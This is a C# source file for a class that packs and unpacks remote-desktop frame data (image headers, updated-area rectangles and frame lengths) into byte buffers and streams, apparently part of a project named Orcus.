using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using Orcus.Shared.Data;

namespace Orcus.Shared.Utilities.Compression
{
    public class RemoteDesktopDataInfo : IDataInfo
    {
        private readonly HeaderInfo _headerInfo;
        private readonly byte[] _data;
        private readonly byte[][] _data2;
        private readonly FrameInfo[] _frameInfos;

        internal RemoteDesktopDataInfo(byte[] data)
        {
            _data = data;
            Length = data.Length;
        }

        internal RemoteDesktopDataInfo(byte[] data, FrameInfo frameInfo, HeaderInfo headerInfo)
        {
            _headerInfo = headerInfo;
            _frameInfos = new FrameInfo[1];
            _frameInfos[0] = frameInfo;

            _data = data;
            Length = data.Length + FrameInfoLength + HeaderLength;
        }

        internal RemoteDesktopDataInfo(byte[][] data, FrameInfo[] frameInfos, HeaderInfo headerInfo)
        {
            if (data.Length != frameInfos.Length)
                throw new InvalidOperationException("The amount of datas and rectangles must be equal");

            _data2 = data;
            _frameInfos = frameInfos;
            _headerInfo = headerInfo;

            Length = HeaderLength;
            for (int i = 0; i < data.Length; i++)
                Length += data[i].Length + FrameInfoLength;
        }

        public int Length { get; }

        public byte[] ToArray()
        {
            byte[] finalData;
            if (_data != null)
            {
                if (_frameInfos == null || _frameInfos.Length != 1)
                    return _data;

                finalData = new byte[Length];
                WriteHeader(_headerInfo, finalData, 0);
                WriteFrameInfo(_frameInfos[0].UpdatedArea, _data.Length, _frameInfos[0].FrameFlags, finalData, HeaderLength);

                Buffer.BlockCopy(_data, 0, finalData, HeaderLength + FrameInfoLength, _data.Length);
                return finalData;
            }

            finalData = new byte[Length];
            WriteHeader(_headerInfo, finalData, 0);

            int position = HeaderLength;

            for (int i = 0; i < _data2.Length; i++)
            {
                byte[] bytes = _data2[i];
                WriteFrameInfo(_frameInfos[i].UpdatedArea, bytes.Length, _frameInfos[i].FrameFlags, finalData, position);
                Buffer.BlockCopy(bytes, 0, finalData, position + FrameInfoLength, bytes.Length);
                position += bytes.Length + FrameInfoLength;
            }

            return finalData;
        }

        public void WriteToBuffer(byte[] buffer, int index)
        {
            if (_data != null)
            {
                if (_frameInfos == null || _frameInfos.Length != 1)
                {
                    Buffer.BlockCopy(_data, 0, buffer, index, _data.Length);
                    return;
                }

                WriteHeader(_headerInfo, buffer, index);
                WriteFrameInfo(_frameInfos[0].UpdatedArea, _data.Length, _frameInfos[0].FrameFlags, buffer, HeaderLength + index);
                Buffer.BlockCopy(_data, 0, buffer, HeaderLength + FrameInfoLength + index, _data.Length);
                return;
            }

            WriteHeader(_headerInfo, buffer, index);
            int position = HeaderLength + index;

            for (int i = 0; i < _data2.Length; i++)
            {
                byte[] bytes = _data2[i];
                WriteFrameInfo(_frameInfos[i].UpdatedArea, bytes.Length, _frameInfos[i].FrameFlags, buffer, position);
                Buffer.BlockCopy(bytes, 0, buffer, position + FrameInfoLength, bytes.Length);
                position += bytes.Length + FrameInfoLength;
            }
        }

        public void WriteIntoStream(Stream outStream)
        {
            if (!outStream.CanWrite)
                throw new Exception("Must have access to Write in the Stream");

            if (_data != null)
            {
                if (_frameInfos == null || _frameInfos.Length != 1)
                {
                    outStream.Write(_data, 0, _data.Length);
                    return;
                }

                WriteHeader(_headerInfo, outStream);
                WriteFrameInfo(_frameInfos[0].UpdatedArea, _data.Length, _frameInfos[0].FrameFlags, outStream);
                outStream.Write(_data, 0, _data.Length);
                return;
            }

            WriteHeader(_headerInfo, outStream);
            for (int i = 0; i < _data2.Length; i++)
            {
                var bytes = _data2[i];
                WriteFrameInfo(_frameInfos[i].UpdatedArea, bytes.Length, _frameInfos[i].FrameFlags, outStream);
                outStream.Write(bytes, 0, bytes.Length);
            }
        }

        internal const int FrameInfoLength = 21;

        internal static void WriteFrameInfo(Rectangle rectangle, int frameLength, FrameFlags frameFlags, Stream stream)
        {
            stream.WriteByte((byte) frameFlags);
            stream.Write(BitConverter.GetBytes(rectangle.X), 0, 4);
            stream.Write(BitConverter.GetBytes(rectangle.Y), 0, 4);
            stream.Write(BitConverter.GetBytes(rectangle.Width), 0, 4);
            stream.Write(BitConverter.GetBytes(rectangle.Height), 0, 4);
            stream.Write(BitConverter.GetBytes(frameLength), 0, 4);
        }

        internal static void WriteFrameInfo(Rectangle rectangle, int frameLength, FrameFlags frameFlags, byte[] data, int index)
        {
            data[index] = (byte) frameFlags;
            Buffer.BlockCopy(BitConverter.GetBytes(rectangle.X), 0, data, index + 1, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(rectangle.Y), 0, data, index + 5, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(rectangle.Width), 0, data, index + 9, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(rectangle.Height), 0, data, index + 13, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(frameLength), 0, data, index + 17, 4);
        }

        internal static unsafe int ReadFrameInfo(byte* data, out FrameFlags frameFlags, out Rectangle rectangle, out int frameLength)
        {
            frameFlags = (FrameFlags) data[0];
            rectangle = new Rectangle(*(int*) (data + 1), *(int*) (data + 5), *(int*) (data + 9), *(int*) (data + 13));
            frameLength = *(int*) (data + 17);
            return FrameInfoLength;
        }

        internal const int HeaderLength = 16;

        internal static void WriteHeader(PixelFormat pixelFormat, ImageMetadata imageMetadata, int imageWidth, int imageHeight, byte[] data, int index)
        {
            Buffer.BlockCopy(BitConverter.GetBytes((int) imageMetadata), 0, data, index, 4);
            Buffer.BlockCopy(BitConverter.GetBytes((int) pixelFormat), 0, data, index + 4, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(imageWidth), 0, data, index + 8, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(imageHeight), 0, data, index + 12, 4);
        }

        internal static void WriteHeader(PixelFormat pixelFormat, ImageMetadata imageMetadata, int imageWidth, int imageHeight, Stream stream)
        {
            stream.Write(BitConverter.GetBytes((int) imageMetadata), 0, 4);
            stream.Write(BitConverter.GetBytes((int) pixelFormat), 0, 4);
            stream.Write(BitConverter.GetBytes(imageWidth), 0, 4);
            stream.Write(BitConverter.GetBytes(imageHeight), 0, 4);
        }

        internal static unsafe int ReadHeader(byte* data, out ImageMetadata imageMetadata, out PixelFormat pixelFormat, out int width, out int height)
        {
            imageMetadata = (ImageMetadata) (*(int*) data);
            pixelFormat = (PixelFormat) (*(int*) (data + 4));
            width = *(int*) (data + 8);
            height = *(int*) (data + 12);
            return HeaderLength;
        }

        internal static void WriteHeader(HeaderInfo headerInfo, Stream stream)
        {
            WriteHeader(headerInfo.Format, headerInfo.ImageMetadata, headerInfo.Width, headerInfo.Height, stream);
        }

        internal static void WriteHeader(HeaderInfo headerInfo, byte[] data, int index)
        {
            WriteHeader(headerInfo.Format, headerInfo.ImageMetadata, headerInfo.Width, headerInfo.Height, data, index);
        }
    }
}